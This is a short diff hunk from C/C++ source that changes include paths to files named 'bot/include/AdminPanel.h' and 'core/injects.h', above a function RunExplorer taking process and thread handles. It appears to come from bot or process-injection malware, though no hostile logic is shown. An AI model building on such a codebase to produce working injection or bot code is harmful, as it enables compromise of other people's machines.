@@ -1,4 +1,5 @@
-#include "core\injects.h"
+#include "../../../bot/include/AdminPanel.h"
+#include "../../include/core/injects.h"
 
 static bool RunExplorer( HANDLE* hprocess, HANDLE* hthread )
 {
